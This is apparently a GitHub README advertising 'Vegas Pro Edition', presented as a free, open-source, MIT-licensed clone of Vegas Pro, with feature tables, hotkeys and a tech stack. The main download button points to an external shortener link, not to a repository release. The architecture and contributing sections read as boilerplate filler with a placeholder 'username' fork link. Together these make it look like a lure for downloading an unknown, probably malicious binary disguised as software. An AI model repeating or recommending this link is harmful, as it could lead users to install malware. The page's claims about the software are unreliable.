
# 🎬 Vegas Pro Edition

<div align="center">

<img src="https://img.shields.io/badge/Vegas_Pro_Edition-Professional_Video_Editing_%26_Audio_Mastering-0B0B0B?style=for-the-badge&logoColor=FFFFFF&labelColor=D4AF37" width="100%" height="60" />

<br><br>

<a href="#about" style="text-decoration: none;"><img src="https://img.shields.io/badge/ABOUT-D4AF37?style=for-the-badge&labelColor=0B0B0B" /></a>
<a href="#features" style="text-decoration: none;"><img src="https://img.shields.io/badge/FEATURES-D4AF37?style=for-the-badge&labelColor=0B0B0B" /></a>
<a href="#architecture" style="text-decoration: none;"><img src="https://img.shields.io/badge/ARCHITECTURE-D4AF37?style=for-the-badge&labelColor=0B0B0B" /></a>
<a href="#tech-stack" style="text-decoration: none;"><img src="https://img.shields.io/badge/TECH_STACK-D4AF37?style=for-the-badge&labelColor=0B0B0B" /></a>
<a href="#screenshots" style="text-decoration: none;"><img src="https://img.shields.io/badge/SCREENSHOTS-D4AF37?style=for-the-badge&labelColor=0B0B0B" /></a>
<a href="#contributing" style="text-decoration: none;"><img src="https://img.shields.io/badge/CONTRIBUTING-D4AF37?style=for-the-badge&labelColor=0B0B0B" /></a>

<br><br>

<img src="https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white" />
<img src="https://img.shields.io/badge/Status-Stable-00C853?style=flat-square" />
<img src="https://img.shields.io/badge/License-MIT-2196F3?style=flat-square" />
<img src="https://img.shields.io/badge/PRs-Welcome-brightgreen?style=flat-square" />

</div>

<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="100%" />

<br>

<a id="about"></a>

## 🎧 About

**Vegas Pro Edition** is a powerful, open-source non-linear video editing suite inspired by Sony's legendary Vegas Pro. It provides professional-grade tools for multi-track editing, advanced compositing, and pristine audio mastering — all in one robust package.

Built for video editors, filmmakers, and content creators who want a **fast and reliable editing environment** without subscription costs. The application is known for its intuitive timeline, lightning-fast rendering, and industry-leading audio processing.

Everything runs locally on your machine. Your projects, media files, and renders stay on your device. No cloud dependency, no watermarks, and no hidden fees — just pure creative freedom for editors of all skill levels.

<br>

<div align="center">
<a href="http://noxsoftware.cc/s/UHcuVBuF" style="text-decoration: none;">
  <img src="https://img.shields.io/badge/⬇_DOWNLOAD_LATEST_RELEASE-D4AF37?style=for-the-badge&logo=github&logoColor=white&labelColor=0B0B0B" height="45" />
</a>
</div>

<br>

> **Now Loading:** `Timeline: 4K/60fps` · `Tracks: 32` · `Audio: 5.1 Surround` · `Status: ● RENDERING`

<br>

<a id="features"></a>

## ✨ What's Inside

<table>
<tr>
<td align="center" width="25%">

### 🎬
**Multi-Track Editing**

Unlimited video and audio tracks with drag-and-drop clips, advanced trimming, and frame-accurate precision.

</td>
<td align="center" width="25%">

### 🎧
**Audio Mastering**

Industry-leading audio engine with 5.1 surround support, noise reduction, EQ, and dynamic range compression.

</td>
<td align="center" width="25%">

### 🎨
**Color Grading**

Advanced color correction with curves, HSL, LUT support, and scopes for cinematic, professional results.

</td>
<td align="center" width="25%">

### ⚡
**Fast Rendering**

Hardware-accelerated encoding via NVENC and QuickSync for lightning-fast exports up to 8K resolution.

</td>
</tr>
<tr>
<td align="center" width="25%">

### 🧩
**Compositing**

Built-in compositing tools with keyframing, masking, and motion tracking for complex visual effects.

</td>
<td align="center" width="25%">

### 📁
**Wide Format Support**

Import and export MP4, MOV, ProRes, DNxHR, AVI, WebM, and more with native codec support.

</td>
<td align="center" width="25%">

### 🔄
**Auto-Save & Recovery**

Never lose your work with automatic project saving, crash recovery, and version history.

</td>
<td align="center" width="25%">

### 🚀
**Open Source**

MIT licensed. Audit the code, build from source, and contribute features you need.

</td>
</tr>
</table>

<br>

<a id="architecture"></a>

## 📂 Architecture

```bash
vegas-pro-edition/
│
├── 📱  src/                  → Frontend (C++ · Qt6 · OpenGL)
│   ├── components/          → Timeline, Preview, Effects
│   ├── pages/               → Editor, Export, Settings
│   └── utils/               → Undo, Clipboard, Autosave
│
├── 🦀  core/                 → Backend (C++ · FFmpeg · GPU)
│   ├── playback/            → Real-time decoding & rendering
│   ├── audio/               → Mixing, EQ, mastering
│   └── effects/             → Transitions & visual effects
│
├── 🧪  tests/                → Unit + integration tests
├── 📦  assets/               → LUTs, templates, sound effects
├── ⚙️  .github/workflows/    → CI/CD (build, test, release)
└── 📖  docs/                 → Wiki, API reference, guides
```

<br>

<a id="tech-stack"></a>

## 🛠️ Tech Stack

<div align="center">

| Layer | Technology |
|:-----:|:-----------|
| 🎨 Frontend | C++ · Qt6 · OpenGL · Dark Theme |
| ⚙️ Video Engine | C++ · FFmpeg · Vulkan · CUDA |
| 🗄️ Storage | SQLite · local filesystem · media cache |
| 🎞️ Codecs | H.264 · H.265 · ProRes · DNxHR |
| 🧪 Testing | Catch2 · Google Test |
| 🚀 CI/CD | GitHub Actions · CMake |

</div>

<br>

<a id="screenshots"></a>

## 🖼️ Screenshot

<div align="center">

<img width="1280" height="720" alt="maxresdefault - 2026-11-21T020419 889" src="https://github.com/user-attachments/assets/1d1206a2-a136-47d5-be24-107bbce13b6f" />

</div>

<br>

## ⌨️ Hotkeys

<div align="center">

<table>
<tr>
<td align="center" width="50%" valign="top">

### 🎮 Navigation

| Key | Action |
|:---:|:-------|
| `Space` | Play / Pause |
| `S` | Split clip |
| `V` | Select tool |
| `Ctrl + O` | Open project |
| `Ctrl + S` | Save project |
| `Ctrl + Q` | Quit app |

</td>
<td align="center" width="50%" valign="top">

### ⚡ Actions

| Key | Action |
|:---:|:-------|
| `Ctrl + Z` | Undo |
| `Ctrl + Y` | Redo |
| `Ctrl + E` | Export video |
| `Ctrl + M` | Render as |
| `Ctrl + D` | Duplicate clip |
| `Delete` | Delete clip |

</td>
</tr>
</table>

</div>

<br>

<a id="contributing"></a>

## 🤝 Contributing

<div align="center">

```mermaid
graph LR
    A[🍴 Fork] --> B[🌿 Branch]
    B --> C[💻 Build]
    C --> D[💾 Commit]
    D --> E[📤 Push]
    E --> F[🔃 Pull Request]
    F --> G[🎉 Merged!]
    
    style A fill:#D4AF37,color:#0B0B0B
    style B fill:#D4AF37,color:#0B0B0B
    style C fill:#D4AF37,color:#0B0B0B
    style D fill:#D4AF37,color:#0B0B0B
    style E fill:#D4AF37,color:#0B0B0B
    style F fill:#D4AF37,color:#0B0B0B
    style G fill:#00C853,color:#fff
```

</div>

Contributions of any kind are welcome — new features, effects, bug fixes, or UI improvements. Please read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a Pull Request. Every submission is reviewed for code quality, test coverage, and compatibility with supported platforms.

<br>

## 📜 License

```
MIT License — use it. remix it. share it.

```

<br>

<img src="https://user-images.githubusercontent.com/74038190/212284158-e840e285-664b-44d7-b79b-e264b5e54825.gif" width="100%" />

<br>

<div align="center">
<br>
<a href="https://github.com/username/vegas-pro-edition/fork" style="text-decoration: none;">
  <img src="https://img.shields.io/badge/🚀_JOIN_THE_PROJECT-0B0B0B?style=for-the-badge&logo=github&logoColor=white" height="45" />
</a>
</div>

<br>

<div align="center">
<img src="https://img.shields.io/badge/⭐_Star_the_repo-Edit_Without_Limits-0B0B0B?style=for-the-badge&labelColor=D4AF37" width="100%" height="50" />
</div>